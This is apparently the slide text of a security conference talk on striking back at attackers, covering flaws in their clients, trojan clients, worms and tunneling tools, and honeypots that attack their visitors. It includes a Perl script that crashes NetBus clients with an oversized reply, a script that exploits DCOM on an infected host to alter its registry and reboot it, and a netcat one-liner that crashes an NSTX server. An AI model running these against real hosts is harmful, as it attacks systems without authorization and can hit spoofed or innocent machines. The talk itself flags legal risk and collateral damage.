If (Syn|Ack) then Rst
Syn
Hacking Back ?
Fighting back usual clients
• Imagine what would happen if the aggressors used
vulnerable or mis-configured clients ?
– Web clients (IE…),
– SSH clients (Putty, OpenSSH…),
– Mail clients (Outlook…),
– DNS resolvers,
– IRC clients…
• Then a remote control/crash would be possible
– Very interesting for Self Defense !
Fighting back usual clients ??
• This is a not a so easy task
– Is it just theory ?
• Fighting back a listening client (mail client, etc) might be
easier because you can try an attack multiple times
(multiple mails...)
• Fighting back an incoming client may be a one shot
operation (web client, etc) during a specific phase
• You will need specific information to launch such an
attack (+ luck ?) :
– Operating System/Hardware (p0f...)
– Version (“Banner”)...
Exploiting Exploits ?
• Imagine what would occur if there were vulnerabilities in
the code of an exploit ?
– Buffer overflow, string format, etc
• Have you ever audit the source code of exploits ?
– Not just talking about the payload
– Script kiddies don’t understand such sources
• “When i launched dcom-xpl.c it did not work !?”
• Automatic tools used to launch remote attacks or audits
are written properly
– NASL for Nessus, Python for Core Impact...
Playing with scanners
• Many kind of scanners are used in the wild
– Network layers
– Banners
– Security tests
• Some are poorly designed from a security point of view
and might lead to insecurity
– Buffer overflows, Format strings
– Reports badly generated (HTML including banners grabbed
on the targets without checking data)
Clients of Trojan Horses
• How many times did you get an incoming probe for
Trojan port toward your internal network ?
• Imagine if there were vulnerabilities in the code of a
Trojan horse client ?
– Then a counterattack would be possible !
• Moreover, it has been seen in the wild that some young
blackhats use the same kind of backdoor on a chain of
bounce
– If you steal the password/method/tool on one host, you could
probably try to climb the chain back to the real author of the
cyber crime
Retaliation : NetBus client
Bind this script on port TCP12345 (netcat, inetd, socat…)
Netbus Assassin Script nb.pl (crashes remote NB clients)
#!/usr/bin/perl
$banner = ”NetBus 1.6\r”
syswrite STDOUT, $banner;
my $byte;
while (sysread(STDIN, $byte, 100) >= 0) {
if($byte =~ m/^GetInfo\r$/)
{ $ans = ”Info;Program Path: C:\\Documents and
Settings\\Administrator\\Patch.exe" . "A" x 100000.
”|Restart persistent: Yes|Login ID:
Administrator|Clients connected to this host: 1\r";
syswrite STDOUT, $ans;
}}
Honeyd versus NetBus client
1) Netbus client connected...
2) Clicked “Get Info” (CPU!)
3)
State
Undefined
(Coma)
Worms
Self Defense
Technology
1) Infection attempt
1) Infection attempt
Worm i+1
2) Reaction
2) Reaction
1) Infection attempt
1) Infection attempt
Worm i-1
2) Reaction
2) Reaction
1) Infection attempt
1) Infection attempt
Worm i
2) Reaction
2) Reaction
Handling worms problems
• Theory : a worm W comes from host A to host H.
=> A is infected by W (?)
=> A is (was) vulnerable to the attack used by W
=> A may still be vulnerable
=> H attacks A through this vulnerability
=> H takes the control of A,
=> H cleans A, patches A, hardens A, etc
• Proof of concept with Honeyd versus MSBlast
– SecurityFocus - Infocus, October 2003 : "Fighting Internet
Worms With Honeypots"
• http://www.securityfocus.com/infocus/1740
– Black Hat Asia, December 2003
•
http://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-oudot/slides/bh-asia-03-oudot.pdf
#!/bin/sh
# launch the exploit against the internal infected attacker
# then execute commands to purify the ugly victim
/usr/local/bin/evil_exploit_dcom -d $1 -t 1 -l 4445  c:\cleaner_msblast.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
   >> c:\cleaner_msblast.reg
echo "windows auto update" = "REM msblast" >> c:\cleaner_msblast.reg
regedit /s c:\cleaner_msblast.reg
del /f c:\cleaner_msblast.reg
shutdown -r -f -t 0
exit
EOF
Example : script to launch an automatic remote cleaning of infected hosts (!)
Honeyd versus MSBlast
Wireless ?
• SecurityFocus - Infocus, February 2003 : "Wireless
Honeypot Trickery”, L.OUDOT
– http://www.securityfocus.com/infocus/1761
• Evil honeypots in the wireless world
– Unofficial Access Point with fake resources
• May be used to steal passwords (Defcon !!!!)
– Rogue Access Point
• Propose (unprotected) wireless access and attack the clients
• May occur on innocent clients (XP that auto-connect...)
– Hacking the hackers
• Wardrivers try to find open AP to access the net (free, anon)
• Some techniques like tunneling are sometimes used...
Wireless Tunnels
• NSTX [http://debmail.dereference.de/nstx] is used to
create IP traffic over DNS (very useful for blackhats on
Wifi networks with DNS open for everybody).
• Advisory Number: RSTACK-20040325
– http://www.securityfocus.com/archive/1/358765
– You can remotely crash the NSTX server :
perl -e '{ print "A" x 500 }' | nc -u $ipdst 53
• Fingerprinting NSTX : the nstx version 1.0 will always
use a tunnel with a UDP source port of 54…
Others ideas
• B00mrang effect : proxy aggression back to aggressor
– add template tcp port 80 proxy $ipsrc:80
• Audit the auditor
– Try to get same kind of information on the aggressor (scan...)
• DOS/DDOS toward the client or its infrastructure
• ...
Real examples…
• Code Red II / Anti code red II « default.ida » script
– Strike back that abuses the remote CRII
• Attack occurs over a TCP session: might be the real
source
• Problem with attacks over simple UDP flows
– e.g. MS SQL Server, UDP 1434, Litchfield related exploits
• Symbiot.com technologies
• …
Requirements
• Graduated response : level of reactions to strike back with a
proportional response
– A too aggressive posture could be dangerous
• Determination of hostile hosts (level of threats)
– Behaviour, intrusion detection analysis, etc
– Risk: false positive (huh! sorry)
• Profiling the attack
– Probes, scanners, exploits, clients, malware, worms, Dos, etc
– Choose the appropriate strike back possibility
– Real life example: DEFense CONdition
•   DEFCON 5 Normal peacetime readiness
•   DEFCON 4 Normal, increased intelligence and strengthened security measures
•   DEFCON 3 Increase in force readiness above normal readiness
•   DEFCON 2 Further Increase in force readiness, less than maximum readiness
•   DEFCON 1 Maximum force readiness.
Specific opportunities
• Though lawyers could argue that Self Defense is a very
dangerous response to a digital threat, one can think
about :
– Honeypots
– Internal Threats
Honeypots
• « A honeypot is a security resource whose values lies in
being probed, attacked or compromised »
– This is a non production system
• Used to delude attackers
– Incoming traffic is suspicious (should avoid false positive)
– That implies that the decision of launching a counterstrike is
probably easier
• Honeypots are really interesting technologies for
aggressive defense purpose
– Incoming traffic might be suspicious and should be
considered as an aggression
– Being “evil” with an aggressor might look like self defense
Wanna play with Honeypots ?
• « Shall we play a game ? »
– Self Defense and honeypots :
• Cansecwest 2004, Vancouver, « Towards evil honeypots, when
they bite back », L.OUDOT
• HOPE 2004, New York, « Retaliation with honeypots »
– Honeypots :
• Honeynet Project : www.honeynet.org (Honeywall CD)
Internal Computers
• Official remote administrator access might be possible
on internal computers/devices
– On a final destination (potential attacker)
– Near potential attackers
• Network devices at one or two hops...
• Self Defense might be used inside your own network in
order to protect it
– Might be an easy and clean method (no exploits, etc)
• Stop processes, add firewall rules, reboot/halt, modify files, patch…
• Might be very useful to avoid fast propagation of worms...
Handling internal threats
• Local Area Network
• Striking back your own computers
– Those computers are under your legal control
– If you have the right to « pentest » them, why could'nt you
strike back in their direction ?
• Very useful to find evil end users
– Corporate hackers, zealot end-users...
• Potential risk: spoofing is easier on a LAN
– Layer 2 attacks, etc
Technical limitations
• Counterstrike technologies might not exist for some kind
of threats
– Need remote exploits for each worms, evil tools, etc [!]
• False positive
• Spoofing
• Collateral damage
Conclusions
• Cool Geeks :
– Really interesting (TECH), Feeling of doing something right
– New possibilities to explore in order to protect an infrastructure
• (not so cool) Managers :
– Legal issues
– Counterstrike might be used to target internal computers/devices
– Add In-Depth Security capabilities (kind of advanced IPS)
• Blackhats :
– Yet another way to attack (attackers ?!)
• e.g. Evil Honeypots
•
Cool BUT : Automatic aggressive defense is still a dangerous activity !
•
Passive|Active Defense ? Future technologies ? Future laws? Culture ?
• Questions ?
• Greetz : MISC Mag, Dragos Ruiu, Dave Dittrich, Jennifer
Granick, Barbara Moran, Nicolas Fischbach, Philippe
Biondi, Frederic Raynal, Folks from Rstack.org